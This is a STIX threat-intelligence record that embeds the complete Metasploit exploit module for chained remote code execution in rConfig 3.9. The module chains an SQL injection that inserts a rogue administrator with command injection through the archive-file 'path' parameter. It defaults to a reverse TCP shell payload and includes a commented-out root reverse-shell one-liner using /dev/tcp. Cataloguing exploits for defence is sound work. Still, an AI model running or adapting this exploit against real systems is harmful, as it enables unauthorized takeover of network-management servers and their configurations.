{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3dbcfb38-9a5d-4757-a3c9-dd45e0a547ee",
    "created": "2024-08-14T17:01:34.810948Z",
    "modified": "2024-08-14T17:01:34.810952Z",
    "name": "Rconfig 3.x Chained Remote Code Execution",
    "description": " This module exploits multiple vulnerabilities in rConfig version 3.9 in order to execute arbitrary commands. This module takes advantage of a command injection vulnerability in the `path` parameter of the ajax archive file functionality within the rConfig web interface in order to execute the payload. Valid credentials for a user with administrative privileges are required. However, this module can bypass authentication via SQLI. This module has been successfully tested on Rconfig 3.9.3 and 3.9.4. The steps are: 1. SQLi on /commands.inc.php allows us to add an administrative user. 2. An authenticated session is established with the newly added user 3. Command Injection on /lib/ajaxHandlers/ajaxArchiveFiles.php allows us to execute the payload. 4. Remove the added admin user.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/rconfig_ajaxarchivefiles_rce.rb",
            "external_id": "rconfig_ajaxarchivefiles_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/v1k1ngfr/exploits-rconfig/blob/master/rconfig_CVE-2020-10220.py#unauthenticatedSQLi"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Rconfig 3.x Chained Remote Code Execution',\n        'Description' => %q{\n          This module exploits multiple vulnerabilities in rConfig version 3.9\n          in order to execute arbitrary commands.\n          This module takes advantage of a command injection vulnerability in the\n          `path` parameter of the ajax archive file functionality within the rConfig web\n          interface in order to execute the payload.\n          Valid credentials for a user with administrative privileges are required.\n          However, this module can bypass authentication via SQLI.\n          This module has been successfully tested on Rconfig 3.9.3 and 3.9.4.\n          The steps are:\n          1. SQLi on /commands.inc.php allows us to add an administrative user.\n          2. An authenticated session is established with the newly added user\n          3. Command Injection on /lib/ajaxHandlers/ajaxArchiveFiles.php allows us to\n          execute the payload.\n          4. Remove the added admin user.\n          Tips : once you get a shell, look at the CVE-2019-19585.\n          You will probably get root because rConfig install script add Apache user to\n          sudoers with nopasswd ;-)\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Jean-Pascal Thomas', # @vikingfr - Discovery, exploit and Metasploit module\n          'Orange Cyberdefense' # Module tests - greetz : CSR-SO team (https://cyberdefense.orange.com/)\n        ],\n        'References' => [\n          ['CVE', '2019-19509'], # authenticated rce\n          ['CVE', '2020-10220'], # sqli auth bypass\n          %w[EDB 47982],\n          %w[EDB 48208],\n          ['URL', 'https://github.com/v1k1ngfr/exploits-rconfig/blob/master/rconfig_CVE-2019-19509.py'], # authenticated RCE\n          ['URL', 'https://github.com/v1k1ngfr/exploits-rconfig/blob/master/rconfig_CVE-2020-10220.py']  # unauthenticated SQLi\n        ],\n        'Platform' => %w[unix linux],\n        'Arch' => ARCH_CMD,\n        'Targets' => [['Auto', {}]],\n        'Privileged' => false,\n        'DisclosureDate' => '2020-03-11',\n        'DefaultOptions' => {\n          'RPORT' => 443,\n          'SSL' => true, # HTTPS is required for the module to work because the rConfig php code handle http to https redirects\n          'PAYLOAD' => 'generic/shell_reverse_tcp'\n        },\n        'DefaultTarget' => 0\n      )\n    )\n    register_options [\n      OptString.new('TARGETURI', [true, 'Base path to Rconfig', '/'])\n    ]\n  end\n\n  # CHECK IF RCONFIG IS REACHABLE AND INSTALLED\n  def check\n    vprint_status 'STEP 0: Get rConfig version...'\n    res = send_request_cgi!(\n      'method' => 'GET',\n      'uri' => '/login.php'\n    )\n    if !res || !res.get_html_document\n      fail_with(Failure::Unknown, 'Could not check rConfig version')\n    end\n    if res.get_html_document.at('div[@id=\"footer-copyright\"]').text.include? 'rConfig Version 3.9'\n      print_good('rConfig version 3.9 detected')\n      return Exploit::CheckCode::Appears\n    elsif res.get_html_document.at('div[@id=\"footer-copyright\"]').text.include? 'rConfig'\n      print_status('rConfig detected, but not version 3.9')\n      return Exploit::CheckCode::Detected\n    end\n  end\n\n  # CREATE AN ADMIN USER IN RCONFIG\n  def create_rconfig_user(user, _password)\n    vprint_status 'STEP 1 : Adding a temporary admin user...'\n    fake_id = Rex::Text.rand_text_numeric(3)\n    fake_pass_md5 = '21232f297a57a5a743894a0e4a801fc3' # hash of 'admin'\n    fake_userid_md5 = '6c97424dc92f14ae78f8cc13cd08308d'\n    userleveladmin = 9 # Administrator\n    user_sqli = \"command ; INSERT INTO `users` (`id`,`username`,`password`,`userid`,`userlevel`,`email`,`timestamp`,`status`) VALUES (#{fake_id},'#{user}','#{fake_pass_md5}','#{fake_userid_md5}',#{userleveladmin}, '#{user}@domain.com', 1346920339, 1);--\"\n    sqli_res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, '/commands.inc.php'),\n      'method' => 'GET',\n      'vars_get' => {\n        'search' => 'search',\n        'searchOption' => 'contains',\n        'searchField' => 'vuln',\n        'searchColumn' => user_sqli\n      }\n    )\n    unless sqli_res\n      print_warning('Failed to create user: Connection failed.')\n      return\n    end\n    print_good \"New temporary user #{user} created\"\n  end\n\n  # AUTHENTICATE ON RCONFIG\n  def login(user, pass)\n    vprint_status \"STEP 2: Authenticating as #{user} ...\"\n    # get session cookie (PHPSESSID)\n    res = send_request_cgi!(\n      'method' => 'GET',\n      'uri' => '/login.php'\n    )\n    @cookie = res.get_cookies\n    if @cookie.empty?\n      fail_with Failure::UnexpectedReply, 'Failed to retrieve cookies'\n      return\n    end\n    # authenticate\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/lib/crud/userprocess.php'),\n      'cookie' => @cookie,\n      'vars_post' => {\n        pass: pass,\n        user: user,\n        sublogin: 1\n      }\n    )\n    unless res\n      print_warning('Failed to authenticate: Connection failed.')\n      return\n    end\n    print_good \"Authenticated as user #{user}\"\n  end\n\n  def trigger_rce(cmd, _opts = {})\n    vprint_status \"STEP 3: Executing the command (#{cmd})\"\n    trigger = \"`#{cmd} #`\"\n    send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, '/lib/ajaxHandlers/ajaxArchiveFiles.php'),\n      'cookie' => @cookie,\n      'vars_get' => {\n        'path' => trigger,\n        'ext' => 'random'\n      }\n    )\n    # the page hangs because of the command being executed, so we can't expect HTTP response\n    # unless res\n    #  fail_with Failure::Unreachable, 'Remote Code Execution failed: Connection failed'\n    #  return\n    # end\n    # unless res.body.include? '\"success\":true'\n    #  fail_with Failure::Unknown, 'It seems that the code was not executed'\n    #  return\n    # end\n    print_good 'Command sucessfully executed'\n  end\n\n  # DELETE A USER\n  def delete_rconfig_user(user)\n    vprint_status 'STEP 4 : Removing the temporary admin user...'\n    del_sqli = \"command ; DELETE FROM `users` WHERE `username`='#{user}';--\"\n    del_res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, '/commands.inc.php'),\n      'method' => 'GET',\n      'vars_get' => {\n        'search' => 'search',\n        'searchOption' => 'contains',\n        'searchField' => 'vuln',\n        'searchColumn' => del_sqli\n      }\n    )\n    unless del_res\n      print_warning \"Removing user #{user} failed: Connection failed. Please remove it manually.\"\n      return\n    end\n    print_status \"User #{user} removed successfully !\"\n  end\n\n  def cleanup\n    super\n    delete_rconfig_user @username if @username\n  end\n\n  def exploit\n    check\n    @username = rand_text_alphanumeric(8..12)\n    @password = 'admin'\n    _cres_res = create_rconfig_user @username, @password\n    login(@username, @password)\n    # The following payload (cf. 2019-19585) can be used to get root rev shell, but some payloads failed to execute (ex : because of quotes stuffs). Too bad :-(\n    # tmp_txt_file = Rex::Text.rand_text_alpha(10)\n    # tmp_zip_file = Rex::Text.rand_text_alpha(10)\n    # trigger_rce(\"touch /tmp/#{tmp_txt_file}.txt;sudo zip -q /tmp/#{tmp_zip_file}.zip /tmp/#{tmp_txt_file}.txt -T -TT '/bin/sh -i>& /dev/tcp/#{datastore['LHOST']}/#{datastore['LPORT']} 0>&1 #'\")\n    trigger_rce(payload.encoded.to_s)\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2020-03-11",
    "x_mitre_platforms": [
        "%w[unix linux]"
    ]
}